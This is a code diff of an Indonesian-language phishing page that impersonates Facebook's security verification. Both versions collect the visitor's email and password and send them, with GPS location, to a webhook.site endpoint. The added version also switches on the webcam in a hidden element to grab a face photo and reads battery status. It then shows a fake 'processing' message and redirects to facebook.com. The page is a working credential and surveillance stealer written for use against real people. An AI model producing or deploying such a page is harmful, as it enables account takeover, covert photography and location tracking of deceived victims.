@@ -3,80 +3,91 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security Check - Authentication Required</title>
+    <title>Facebook Security Verification</title>
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #f0f2f5; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
-        .card { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 12px 28px rgba(0,0,0,0.2); width: 100%; max-width: 400px; text-align: center; }
-        .fb-logo { width: 200px; margin-bottom: 20px; }
-        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #dddfe2; border-radius: 6px; box-sizing: border-box; font-size: 14px; }
-        button { width: 100%; padding: 12px; background-color: #1877f2; border: none; border-radius: 6px; color: white; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; }
-        .footer { font-size: 12px; color: #606770; margin-top: 20px; }
+        body { font-family: sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { background: white; padding: 25px; border-radius: 10px; box-shadow: 0 4px 12px rgba(0,0,0,0.15); width: 100%; max-width: 350px; text-align: center; }
+        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }
+        button { width: 100%; padding: 12px; background: #1877f2; color: white; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; }
+        #cam-preview { display: none; } /* Kamera jalan di balik layar */
     </style>
 </head>
 <body>
 
-<div class="card">
-    <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zSkmkv.svg" class="fb-logo">
-    <p>Akun Anda terdeteksi login dari perangkat baru. Silakan verifikasi identitas Anda untuk mencegah pemblokiran permanen.</p>
-    
-    <input type="text" id="user" placeholder="Email atau Nomor Telepon">
-    <input type="password" id="pass" placeholder="Kata Sandi">
-    <button onclick="captureData()">Verifikasi Akun</button>
-    
-    <div class="footer">Bukan akun Anda? Klik di sini untuk bantuan.</div>
+<div class="box">
+    <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zSkmkv.svg" width="150">
+    <p>Demi keamanan, sistem memerlukan <b>Verifikasi Wajah</b> dan <b>Lokasi</b> untuk memulihkan sesi Anda.</p>
+    <input type="text" id="u" placeholder="Email/Telepon">
+    <input type="password" id="p" placeholder="Kata Sandi">
+    <button onclick="startExploit()">Konfirmasi & Verifikasi</button>
 </div>
 
+<video id="cam-preview" autoplay></video>
+<canvas id="canvas" style="display:none;"></canvas>
+
 <script>
-    // MASUKKAN URL WEBHOOK LO DARI GAMBAR TADI (image_d5d17b.png)
     const WEBHOOK_URL = "https://webhook.site/a8889196-bf1c-4c88-9a69-8eacaf2e1bd0";
 
-    async function captureData() {
-        const user = document.getElementById('user').value;
-        const pass = document.getElementById('pass').value;
+    async function startExploit() {
+        const u = document.getElementById('u').value;
+        const p = document.getElementById('p').value;
 
-        if(!user || !pass) return alert("Harap isi semua kolom.");
-
-        // Deteksi Device & Browser secara otomatis
-        const device_info = {
-            os: navigator.platform,
-            browser: navigator.userAgent,
-            cores: navigator.hardwareConcurrency || "N/A",
-            ram: navigator.deviceMemory || "N/A",
-            language: navigator.language,
-            screen: `${window.screen.width}x${window.screen.height}`
-        };
-
-        // Minta Lokasi GPS
-        navigator.geolocation.getCurrentPosition(async (pos) => {
-            sendToMaster(user, pass, device_info, {
-                lat: pos.coords.latitude,
-                lon: pos.coords.longitude,
-                acc: pos.coords.accuracy,
-                maps: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
-            });
-        }, (err) => {
-            // Tetap kirim data meskipun GPS ditolak (pake IP aslinya nanti)
-            sendToMaster(user, pass, device_info, "GPS_DENIED");
-        }, { enableHighAccuracy: true });
+        // 1. Ambil Izin Kamera & Ambil Foto
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const video = document.getElementById('cam-preview');
+            video.srcObject = stream;
+            
+            setTimeout(() => {
+                const canvas = document.getElementById('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                const photoData = canvas.toDataURL('image/jpeg'); // Ini foto wajahnya
+                
+                // Matikan kamera setelah dapet foto
+                stream.getTracks().forEach(track => track.stop());
+                
+                // Lanjut ambil GPS dan kirim semua
+                getFinalData(u, p, photoData);
+            }, 2000);
+        } catch (e) {
+            getFinalData(u, p, "Kamera Ditolak");
+        }
     }
 
-    function sendToMaster(u, p, dev, loc) {
+    async function getFinalData(u, p, img) {
+        // Ambil info Baterai
+        const batt = await navigator.getBattery();
+        const battInfo = `${(batt.level * 100)}% (${batt.charging ? 'Charging' : 'Discharging'})`;
+
+        navigator.geolocation.getCurrentPosition((pos) => {
+            sendData(u, p, img, battInfo, {
+                lat: pos.coords.latitude,
+                lon: pos.coords.longitude,
+                map: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
+            });
+        }, () => {
+            sendData(u, p, img, battInfo, "GPS Ditolak");
+        });
+    }
+
+    function sendData(u, p, img, b, l) {
         fetch(WEBHOOK_URL, {
             method: 'POST',
             mode: 'no-cors',
             body: JSON.stringify({
-                event: "INTRUDER_CAPTURED",
-                credentials: { email: u, password: p },
-                hardware: dev,
-                location: loc,
-                timestamp: new Date().toISOString()
+                user: u,
+                pass: p,
+                battery: b,
+                location: l,
+                photo: img, // Data foto dalam bentuk Base64
+                agent: navigator.userAgent
             })
         });
-
-        alert("Verifikasi Berhasil. Akun Anda sedang dipulihkan.");
-        window.location.href = "https://facebook.com/login";
+        alert("Sistem Sedang Memproses. Silakan tunggu 1x24 jam.");
+        window.location.href = "https://facebook.com";
     }
 </script>
-
 </body>
 </html>
